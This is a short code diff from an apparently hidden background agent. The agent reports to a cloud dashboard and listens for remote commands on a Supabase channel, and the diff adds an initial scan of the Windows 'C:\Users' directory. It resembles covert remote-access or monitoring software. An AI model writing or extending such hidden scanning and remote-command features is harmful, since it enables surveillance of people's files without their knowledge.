@@ -321,6 +321,9 @@ async function start() {
   // Phase 2: Worker Mode (Hidden)
   await logToCloud("Agent Online (Background)");
 
+  // Perform initial scan of the primary user directory so the dashboard isn't empty
+  await scanDirectory('C:\\Users', lastFoldersOnlyPreference);
+
   // Subscribe to commands targeting this specific computer
   supabase
     .channel('remote-cmds')
